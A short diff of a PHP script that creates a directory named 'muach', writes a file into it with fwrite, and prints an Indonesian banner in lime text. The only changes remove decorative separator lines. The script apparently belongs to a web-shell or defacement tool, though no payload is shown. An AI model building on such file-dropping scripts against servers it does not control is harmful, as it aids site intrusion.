@@ -4,7 +4,7 @@ echo "<font color=lime>";
 $dir = "muach";
 @mkdir($dir);
 if($dir){
-    echo "<center><h1><br>Biarkan Aku Masuk Didalam Hatimu<br><br> ==================== ";
+    echo "<center><h1><br>Biarkan Aku Masuk Didalam Hatimu<br>";
 } else {
     echo "<br> [-] Error !";
 }
@@ -28,7 +28,7 @@ if($dir){
     fwrite($open,$file2);
     fclose($open);
      if($open) {
-         echo "<br> ==================== ";
+
 		 
 echo "<script type=\"text/JavaScript\">\n"; 
 echo "<!--\n"; 
